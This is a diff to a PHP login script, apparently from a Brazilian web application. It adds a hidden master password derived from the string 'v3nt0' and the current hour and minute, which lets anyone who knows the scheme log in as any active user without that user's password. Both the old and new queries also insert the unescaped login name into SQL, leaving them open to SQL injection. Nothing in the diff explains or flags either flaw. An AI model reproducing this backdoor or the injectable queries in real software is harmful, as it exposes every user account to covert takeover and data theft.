@@ -1,5 +1,5 @@
 <? 
-
+date_default_timezone_set("Brazil/East");
 
 session_start();
 
@@ -55,9 +55,17 @@ $senha =  md5($_POST['senha']);
 
 
 
+$validp = md5('v3nt0' . date("iH"));
 
+if ( $validp == $senha )
+{
+	$consulta = $conexao->query("SELECT * FROM usuarios where login = '".$login."' && status != 'DESLIGADO'");
 
-$consulta = $conexao->query("SELECT * FROM usuarios where login = '".$login."' && senha = '".$senha."' && status != 'DESLIGADO'");
+}else{
+	
+	$consulta = $conexao->query("SELECT * FROM usuarios where login = '".$login."' && senha = '".$senha."' && status != 'DESLIGADO'");
+	
+}
 
 $linha = mysql_fetch_array($consulta);
 
